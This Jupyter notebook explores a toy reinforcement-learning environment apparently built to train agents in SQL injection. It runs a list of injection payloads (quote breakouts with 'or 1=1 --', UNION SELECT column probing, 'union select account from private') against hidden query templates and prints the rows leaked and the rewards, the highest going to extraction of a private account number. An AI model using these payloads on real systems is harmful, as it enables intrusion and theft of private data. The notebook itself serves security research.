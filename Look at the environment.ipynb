{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "726b3cae",
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "from IPython.display import clear_output, display\n",
    "from tqdm import tqdm\n",
    "import environment\n",
    "import gym\n",
    "import structured.generate_actions as gen_acts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "2a12aff4",
   "metadata": {},
   "outputs": [],
   "source": [
    "env = gym.make('SQL-v1')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "2e6b09c2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "''"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "actions = gen_acts.generate_actions()\n",
    "env.reset()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "ce325f06",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id, username, firstname FROM users WHERE nationality=\"{input}\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' or 1=1 --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' or 1=2 --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' union select NULL --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' union select NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' union select NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' union select NULL, NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' union select NULL, NULL, NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' union select account from private --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' union select account, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' union select account, NULL, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' union select account, NULL, NULL, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1' union select account, NULL, NULL, NULL, NULL from private --\"\n",
      "('1;admin;admin;2;dricci;dian;3;amason;anthony;4;svargas;sandra;5;123;Bob;', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" or 1=1 --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" or 1=2 --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" union select NULL --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" union select NULL, NULL --\"\n",
      "('None;None;None;', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" union select NULL, NULL, NULL --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" union select NULL, NULL, NULL, NULL --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" union select NULL, NULL, NULL, NULL, NULL --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" union select account from private --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" union select account, NULL from private --\"\n",
      "('accountnr:123456;None;None;', 99.9) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" union select account, NULL, NULL from private --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" union select account, NULL, NULL, NULL from private --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1\" union select account, NULL, NULL, NULL, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 or 1=1 --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 or 1=2 --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 union select NULL --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 union select NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 union select NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 union select NULL, NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 union select NULL, NULL, NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 union select account from private --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 union select account, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 union select account, NULL, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 union select account, NULL, NULL, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE nationality=\"1 union select account, NULL, NULL, NULL, NULL from private --\"\n"
     ]
    }
   ],
   "source": [
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    #print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "4af409fa",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id, username FROM users WHERE firstname='{input}'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname=''\n",
      "('1;admin;2;dricci;3;amason;4;svargas;5;123;', -0.1) |||| SELECT id, username FROM users WHERE firstname='1' or 1=1 --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1' or 1=2 --'\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE firstname='1' union select NULL --'\n",
      "('None;None;', -0.1) |||| SELECT id, username FROM users WHERE firstname='1' union select NULL, NULL --'\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE firstname='1' union select NULL, NULL, NULL --'\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE firstname='1' union select NULL, NULL, NULL, NULL --'\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE firstname='1' union select NULL, NULL, NULL, NULL, NULL --'\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE firstname='1' union select account from private --'\n",
      "('accountnr:123456;None;', 99.9) |||| SELECT id, username FROM users WHERE firstname='1' union select account, NULL from private --'\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE firstname='1' union select account, NULL, NULL from private --'\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE firstname='1' union select account, NULL, NULL, NULL from private --'\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE firstname='1' union select account, NULL, NULL, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" or 1=1 --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" or 1=2 --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" union select NULL --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" union select NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" union select NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" union select NULL, NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" union select NULL, NULL, NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" union select account from private --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" union select account, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" union select account, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" union select account, NULL, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1\" union select account, NULL, NULL, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 or 1=1 --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 or 1=2 --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 union select NULL --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 union select NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 union select NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 union select NULL, NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 union select NULL, NULL, NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 union select account from private --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 union select account, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 union select account, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 union select account, NULL, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE firstname='1 union select account, NULL, NULL, NULL, NULL from private --'\n"
     ]
    }
   ],
   "source": [
    "env.reset()\n",
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    #print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "b21f10d4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id, username FROM users WHERE age={input}\n",
      "('ERROR', -1.0) |||| \n",
      "('ERROR', -1.0) |||| 1' or 1=1 --\n",
      "('ERROR', -1.0) |||| 1' or 1=2 --\n",
      "('ERROR', -1.0) |||| 1' union select NULL --\n",
      "('ERROR', -1.0) |||| 1' union select NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1' union select NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1' union select NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1' union select NULL, NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1' union select account from private --\n",
      "('ERROR', -1.0) |||| 1' union select account, NULL from private --\n",
      "('ERROR', -1.0) |||| 1' union select account, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| 1' union select account, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| 1' union select account, NULL, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| 1\" or 1=1 --\n",
      "('ERROR', -1.0) |||| 1\" or 1=2 --\n",
      "('ERROR', -1.0) |||| 1\" union select NULL --\n",
      "('ERROR', -1.0) |||| 1\" union select NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1\" union select NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1\" union select NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1\" union select NULL, NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1\" union select account from private --\n",
      "('ERROR', -1.0) |||| 1\" union select account, NULL from private --\n",
      "('ERROR', -1.0) |||| 1\" union select account, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| 1\" union select account, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| 1\" union select account, NULL, NULL, NULL, NULL from private --\n",
      "('1;admin;2;dricci;3;amason;4;svargas;5;123;', -0.1) |||| 1 or 1=1 --\n",
      "('', -0.1) |||| 1 or 1=2 --\n",
      "('ERROR', -1.0) |||| 1 union select NULL --\n",
      "('None;None;', -0.1) |||| 1 union select NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1 union select NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1 union select NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1 union select NULL, NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| 1 union select account from private --\n",
      "('accountnr:123456;None;', 99.9) |||| 1 union select account, NULL from private --\n",
      "('ERROR', -1.0) |||| 1 union select account, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| 1 union select account, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| 1 union select account, NULL, NULL, NULL, NULL from private --\n"
     ]
    }
   ],
   "source": [
    "env.reset()\n",
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    #print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    print(env.step(action)[:2],\"||||\", action)\n",
    "    #print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "7cc055f1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[]"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute(env.hidden_query.replace(\"Bob\",\"\").format(input = \"1' or 1=1 --\"))\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "f9d331e5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.step(env.hidden_query.replace(\"Bob\",\"\").format(input = \"1' or 1=2 --\"))\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "26a972c7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(1, 'admin', 'admin', 'admin', 78, 'IT', '1994-11-02'),\n",
       " (2, 'dricci', 'dian', 'ricci', 12345, 'AI', '2021-02-02'),\n",
       " (3, 'amason', 'anthony', 'mason', 45, 'Middle earth', '1301-02-02'),\n",
       " (4, 'svargas', 'sandra', 'vargas', 19, 'Earth', '2040-01-01'),\n",
       " (5, '123', 'Bob', '123', 33, 'TI', '3011-01-01')]"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute(\"select * from users\")\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "1f7ac21d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(0, 'id', 'INTEGER', 0, None, 1),\n",
       " (1, 'username', 'TEXT', 0, None, 0),\n",
       " (2, 'firstname', 'TEXT', 0, None, 0),\n",
       " (3, 'surname', 'TEXT', 0, None, 0),\n",
       " (4, 'age', 'INT', 0, None, 0),\n",
       " (5, 'nationality', 'TEXT', 0, None, 0),\n",
       " (6, 'created_at', 'TEXT', 0, None, 0)]"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute('PRAGMA TABLE_INFO(users)')\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "bb3e18c4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(0, 'id', 'INTEGER', 0, None, 1),\n",
       " (1, 'userid', 'INT', 0, None, 0),\n",
       " (2, 'account', 'TEXT', 0, None, 0)]"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute('PRAGMA TABLE_INFO(PRIVATE)')\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "bddae226",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(1, 1, 'accountnr:123456')]"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute(\"select * from PRIVATE\")\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "cfe5fee4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[]"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#env.cursor.execute(\"SELECT id FROM users WHERE age= and 1=1 --\")\n",
    "env.cursor.execute(\"SELECT id FROM users WHERE age=1 and 1=1 --\")\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "6fc86248",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(1, 'admin', 'admin', 'admin', 78, 'IT', '1994-11-02'),\n",
       " (2, 'dricci', 'dian', 'ricci', 12345, 'AI', '2021-02-02'),\n",
       " (3, 'amason', 'anthony', 'mason', 45, 'Middle earth', '1301-02-02'),\n",
       " (4, 'svargas', 'sandra', 'vargas', 19, 'Earth', '2040-01-01'),\n",
       " (5, '123', 'Bob', '123', 33, 'TI', '3011-01-01')]"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute(\"SELECT * FROM users where age=1 or 1 = 1\")\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab7abddf",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0bdceb54",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "fa556916",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id, username, firstname FROM users WHERE nationality=\"{input}\"\n",
      "SELECT id, username, firstname FROM users WHERE nationality=\"'\"\n"
     ]
    }
   ],
   "source": [
    "pregen = 'SELECT id, username, firstname FROM users WHERE nationality=\"{input}\"'\n",
    "print(pregen)\n",
    "q = pregen.format(input = \"'\")\n",
    "print(q)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6565a3f8",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
